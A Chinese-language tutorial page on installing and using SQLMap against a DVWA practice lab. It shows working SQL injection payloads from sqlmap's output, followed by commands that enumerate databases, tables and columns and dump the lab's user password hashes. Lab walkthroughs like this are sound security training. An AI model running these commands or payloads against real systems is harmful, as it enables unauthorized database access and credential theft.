---
slug: /net-security/06/02
---

# 渗透测试工具 SQLMap

🏠 官网：[https://sqlmap.org/](https://sqlmap.org/)

## 安装

Linux/MacOS  下安装 SQLMap：

1. 将项目克隆到本地文件夹 

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

2. 进入到文件夹 `sqlmap-dev` 中，执行更新

```bash
python3 sqlmap.py --update
```

3. 查看帮助信息

```bash
python3 sqlmap.py -hh
```

## 简介

🧨 **sqlmap** 是一个开源的渗透测试工具，它自动化了检测和利用 SQL 注入漏洞以及接管数据库服务器的过程。

支持的数据库有：*MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, Informix, MariaDB, MemSQL, TiDB, CockroachDB, HSQLDB, H2, MonetDB, Apache Derby, Amazon Redshift, Vertica, Mckoi, Presto, Altibase, MimerSQL, CrateDB, Greenplum, Drizzle, Apache Ignite, Cubrid, InterSystems Cache, IRIS, eXtremeDB, FrontBase, Raima Database Manager, YugabyteDB, ClickHouse and Virtuoso*

🫱 更多见官网介绍



## 基本使用

对 DVWA 靶场进行扫描：`python3 sqlmap.py -u "http://YOUR_IP_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch`

扫描结果：

```bash
sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: id=123' OR NOT 1015=1015#&Submit=Submit

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=123' AND (SELECT 8471 FROM(SELECT COUNT(*),CONCAT(0x716a767171,(SELECT (ELT(8471=8471,1))),0x7170626271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- mKpW&Submit=Submit

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=123' AND (SELECT 2021 FROM (SELECT(SLEEP(5)))dEdm)-- KgwR&Submit=Submit

    Type: UNION query
    Title: MySQL UNION query (NULL) - 2 columns
    Payload: id=123' UNION ALL SELECT CONCAT(0x716a767171,0x68756a4a675242784f43596a4d505a4e7243436551716275536c646c535a64534354787044637977,0x7170626271),NULL#&Submit=Submit
---
[19:30:35] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0
```



## 进阶使用

1. 获取库：`python3 sqlmap.py -u "http://YOUR_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch --dbs`

```
...
[09:23:51] [INFO] fetching database names
available databases [4]:
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
...
```

2. 获取表：`python3 sqlmap.py -u "http://YOUR_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch -D dvwa --tables`

```
...
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+
...
```

3. 获取表的字段：`python3 sqlmap.py -u "http://YOUR_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch -D dvwa -T users --co
   lumns`

```
...
Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+
...
```

3. 获取表中指定字段的值：` python3 sqlmap.py -u "http://YOUR_ADDRESS:8080/vulnerabilities/sqli?id=123&Submit=Submit#" --cookie="PHPSESSID=98vc49t5lips67c82cp3glpft4; security=low"  --batch -D dvwa -T users -C user,password --dump`

```
...
Database: dvwa
Table: users
[5 entries]
+---------+---------------------------------------------+
| user    | password                                    |
+---------+---------------------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
| gordonb | e99a18c428cb38d5f260853678922e03 (abc123)   |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+---------+---------------------------------------------+
...
```



